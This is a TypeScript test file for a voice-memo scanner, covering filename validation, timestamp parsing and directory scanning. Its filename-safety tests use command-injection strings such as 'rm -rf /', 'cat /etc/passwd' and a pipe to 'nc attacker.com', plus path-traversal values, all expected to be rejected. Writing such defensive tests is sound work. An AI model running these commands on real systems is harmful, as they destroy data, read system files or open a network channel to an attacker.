import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { symlinkSync } from "node:fs";
import { join } from "node:path";
import { ensureDirSync, writeTextFileSync } from "@sidequest/core/fs";
import { cleanupTestDir, createTempDir } from "@sidequest/core/testing";
import {
	isSafeFilename,
	parseVoiceMemoTimestamp,
	scanVoiceMemos,
} from "./scanner";

describe("voice/scanner", () => {
	let tempDir: string;
	let recordingsDir: string;

	beforeEach(() => {
		tempDir = createTempDir("voice-scanner-");
		recordingsDir = join(tempDir, "Recordings");
		ensureDirSync(recordingsDir);
	});

	afterEach(() => {
		cleanupTestDir(tempDir);
	});

	describe("isSafeFilename", () => {
		test("accepts valid voice memo filenames", () => {
			expect(isSafeFilename("20251228 143045-abc123.m4a")).toBe(true);
			expect(isSafeFilename("20251229 095030-def456.M4A")).toBe(true);
			expect(isSafeFilename("Recording_001.m4a")).toBe(true);
			expect(isSafeFilename("My Voice Memo.m4a")).toBe(true);
		});

		test("rejects filenames with shell metacharacters", () => {
			// Command injection attempts
			expect(isSafeFilename("file; rm -rf /.m4a")).toBe(false);
			expect(isSafeFilename("file$(whoami).m4a")).toBe(false);
			expect(isSafeFilename("file`id`.m4a")).toBe(false);
			expect(isSafeFilename("file&& cat /etc/passwd.m4a")).toBe(false);
			expect(isSafeFilename("file| nc attacker.com.m4a")).toBe(false);

			// Path traversal attempts
			expect(isSafeFilename("../../../etc/passwd.m4a")).toBe(false);
			expect(isSafeFilename("..\\..\\..\\windows\\system32.m4a")).toBe(false);

			// Special characters
			expect(isSafeFilename("file*.m4a")).toBe(false);
			expect(isSafeFilename("file?.m4a")).toBe(false);
			expect(isSafeFilename("file<script>.m4a")).toBe(false);
			expect(isSafeFilename("file>output.m4a")).toBe(false);
		});

		test("rejects non-m4a extensions", () => {
			expect(isSafeFilename("file.mp3")).toBe(false);
			expect(isSafeFilename("file.wav")).toBe(false);
			expect(isSafeFilename("file.txt")).toBe(false);
			expect(isSafeFilename("file")).toBe(false);
		});
	});

	describe("parseVoiceMemoTimestamp", () => {
		test("parses valid timestamp from filename", () => {
			const result = parseVoiceMemoTimestamp("20251228 143045-abc123.m4a");

			expect(result).toBeDefined();
			expect(result?.year).toBe(2025);
			expect(result?.month).toBe(12);
			expect(result?.day).toBe(28);
			expect(result?.hour).toBe(14);
			expect(result?.minute).toBe(30);
			expect(result?.second).toBe(45);
		});

		test("returns null for invalid filename format", () => {
			expect(parseVoiceMemoTimestamp("invalid.m4a")).toBeNull();
			expect(parseVoiceMemoTimestamp("2025-12-28.m4a")).toBeNull();
			expect(parseVoiceMemoTimestamp("not-a-voice-memo.txt")).toBeNull();
		});

		test("handles edge case timestamps", () => {
			// Midnight
			const midnight = parseVoiceMemoTimestamp("20251228 000000-abc123.m4a");
			expect(midnight?.hour).toBe(0);
			expect(midnight?.minute).toBe(0);
			expect(midnight?.second).toBe(0);

			// End of day
			const endOfDay = parseVoiceMemoTimestamp("20251228 235959-abc123.m4a");
			expect(endOfDay?.hour).toBe(23);
			expect(endOfDay?.minute).toBe(59);
			expect(endOfDay?.second).toBe(59);
		});

		test("returns null for invalid month values", () => {
			// Month 0 (invalid - months are 1-12)
			expect(parseVoiceMemoTimestamp("20251300 120000-abc123.m4a")).toBeNull();
			// Month 13 (invalid)
			expect(parseVoiceMemoTimestamp("20251328 120000-abc123.m4a")).toBeNull();
		});

		test("returns null for invalid day values", () => {
			// Day 0 (invalid - days are 1-31)
			expect(parseVoiceMemoTimestamp("20251200 120000-abc123.m4a")).toBeNull();
			// Day 32 (invalid)
			expect(parseVoiceMemoTimestamp("20251232 120000-abc123.m4a")).toBeNull();
			// Day 99 (invalid)
			expect(parseVoiceMemoTimestamp("20251299 120000-abc123.m4a")).toBeNull();
		});

		test("returns null for invalid hour values", () => {
			// Hour 24 (invalid - hours are 0-23)
			expect(parseVoiceMemoTimestamp("20251228 240000-abc123.m4a")).toBeNull();
			// Hour 25 (invalid)
			expect(parseVoiceMemoTimestamp("20251228 250000-abc123.m4a")).toBeNull();
			// Hour 99 (invalid)
			expect(parseVoiceMemoTimestamp("20251228 990000-abc123.m4a")).toBeNull();
		});

		test("returns null for invalid minute values", () => {
			// Minute 60 (invalid - minutes are 0-59)
			expect(parseVoiceMemoTimestamp("20251228 126000-abc123.m4a")).toBeNull();
			// Minute 99 (invalid)
			expect(parseVoiceMemoTimestamp("20251228 129900-abc123.m4a")).toBeNull();
		});

		test("returns null for invalid second values", () => {
			// Second 60 (invalid - seconds are 0-59)
			expect(parseVoiceMemoTimestamp("20251228 120060-abc123.m4a")).toBeNull();
			// Second 99 (invalid)
			expect(parseVoiceMemoTimestamp("20251228 120099-abc123.m4a")).toBeNull();
		});

		test("returns null for invalid year values", () => {
			// Year 1999 (below 2000 threshold)
			expect(parseVoiceMemoTimestamp("19991228 120000-abc123.m4a")).toBeNull();
			// Year 2101 (above 2100 threshold)
			expect(parseVoiceMemoTimestamp("21011228 120000-abc123.m4a")).toBeNull();
		});
	});

	describe("scanVoiceMemos", () => {
		test("finds voice memo files in directory", () => {
			// Create test voice memo files
			writeTextFileSync(
				join(recordingsDir, "20251228 143045-abc123.m4a"),
				"mock audio",
			);
			writeTextFileSync(
				join(recordingsDir, "20251229 095030-def456.m4a"),
				"mock audio",
			);

			const memos = scanVoiceMemos(recordingsDir);

			expect(memos).toHaveLength(2);
			expect(memos.map((m) => m.filename)).toEqual([
				"20251228 143045-abc123.m4a",
				"20251229 095030-def456.m4a",
			]);
		});

		test("returns empty array for empty directory", () => {
			const memos = scanVoiceMemos(recordingsDir);
			expect(memos).toHaveLength(0);
		});

		test("skips non-voice-memo files", () => {
			writeTextFileSync(
				join(recordingsDir, "20251228 143045-abc123.m4a"),
				"mock audio",
			);
			writeTextFileSync(join(recordingsDir, "random-file.txt"), "text");
			writeTextFileSync(join(recordingsDir, "other.m4a"), "audio");

			const memos = scanVoiceMemos(recordingsDir);

			expect(memos).toHaveLength(1);
			expect(memos[0]).toMatchObject({
				filename: "20251228 143045-abc123.m4a",
			});
		});

		test("skips files with size 0 (iCloud not synced)", () => {
			// Create file with content (size > 0)
			writeTextFileSync(
				join(recordingsDir, "20251228 143045-abc123.m4a"),
				"mock audio",
			);

			// Create empty file (size = 0)
			writeTextFileSync(join(recordingsDir, "20251229 095030-def456.m4a"), "");

			const memos = scanVoiceMemos(recordingsDir);

			expect(memos).toHaveLength(1);
			expect(memos[0]).toMatchObject({
				filename: "20251228 143045-abc123.m4a",
			});
		});

		test("includes full path in VoiceMemo object", () => {
			writeTextFileSync(
				join(recordingsDir, "20251228 143045-abc123.m4a"),
				"mock audio",
			);

			const memos = scanVoiceMemos(recordingsDir);

			expect(memos).toHaveLength(1);
			expect(memos[0]).toMatchObject({
				path: join(recordingsDir, "20251228 143045-abc123.m4a"),
			});
		});

		test("includes parsed timestamp in VoiceMemo object", () => {
			writeTextFileSync(
				join(recordingsDir, "20251228 143045-abc123.m4a"),
				"mock audio",
			);

			const memos = scanVoiceMemos(recordingsDir);

			expect(memos).toHaveLength(1);
			const memo = memos[0];

			expect(memo?.timestamp).toBeDefined();
			expect(memo?.timestamp.getFullYear()).toBe(2025);
			expect(memo?.timestamp.getMonth()).toBe(11); // December (0-indexed)
			expect(memo?.timestamp.getDate()).toBe(28);
			expect(memo?.timestamp.getHours()).toBe(14);
			expect(memo?.timestamp.getMinutes()).toBe(30);
		});

		test("filters by --since date", () => {
			writeTextFileSync(
				join(recordingsDir, "20251225 100000-old.m4a"),
				"mock audio",
			);
			writeTextFileSync(
				join(recordingsDir, "20251228 143045-new.m4a"),
				"mock audio",
			);
			writeTextFileSync(
				join(recordingsDir, "20251229 095030-newer.m4a"),
				"mock audio",
			);

			const since = new Date("2025-12-27");
			const memos = scanVoiceMemos(recordingsDir, { since });

			expect(memos).toHaveLength(2);
			expect(memos.map((m) => m.filename)).toEqual([
				"20251228 143045-new.m4a",
				"20251229 095030-newer.m4a",
			]);
		});

		test("sorts memos by timestamp ascending", () => {
			writeTextFileSync(
				join(recordingsDir, "20251229 095030-newer.m4a"),
				"mock audio",
			);
			writeTextFileSync(
				join(recordingsDir, "20251228 143045-older.m4a"),
				"mock audio",
			);
			writeTextFileSync(
				join(recordingsDir, "20251230 120000-newest.m4a"),
				"mock audio",
			);

			const memos = scanVoiceMemos(recordingsDir);

			expect(memos).toHaveLength(3);
			expect(memos.map((m) => m.filename)).toEqual([
				"20251228 143045-older.m4a",
				"20251229 095030-newer.m4a",
				"20251230 120000-newest.m4a",
			]);
		});

		test("handles non-existent directory gracefully", () => {
			const nonExistentDir = join(tempDir, "does-not-exist");
			const memos = scanVoiceMemos(nonExistentDir);

			expect(memos).toHaveLength(0);
		});

		test("only returns files that pass safety validation", () => {
			// Create valid file
			writeTextFileSync(
				join(recordingsDir, "20251228 143045-abc123.m4a"),
				"mock audio",
			);

			// Integration test: verifies that scanVoiceMemos() internally uses isSafeFilename()
			// to filter files. We can't create files with unsafe characters (filesystem rejects them),
			// but isSafeFilename() is thoroughly tested in its own describe block (lines 26-58).
			const validMemos = scanVoiceMemos(recordingsDir);

			// Only the valid file should be processed
			expect(validMemos).toHaveLength(1);
			expect(validMemos[0]).toMatchObject({
				filename: "20251228 143045-abc123.m4a",
			});
		});

		test("skips symlinks to prevent path traversal", () => {
			// Create a regular file
			const regularFile = join(recordingsDir, "20251228 143045-abc123.m4a");
			writeTextFileSync(regularFile, "mock audio");

			// Create a symlink using Node.js fs (synchronous, no process leak)
			const symlinkPath = join(recordingsDir, "20251229 095030-symlink.m4a");
			try {
				symlinkSync(regularFile, symlinkPath);
			} catch {
				// Skip test if symlinks not supported
				return;
			}

			const memos = scanVoiceMemos(recordingsDir);

			// Only the regular file should be included, not the symlink
			expect(memos).toHaveLength(1);
			expect(memos[0]).toMatchObject({
				filename: "20251228 143045-abc123.m4a",
			});
		});
	});
});
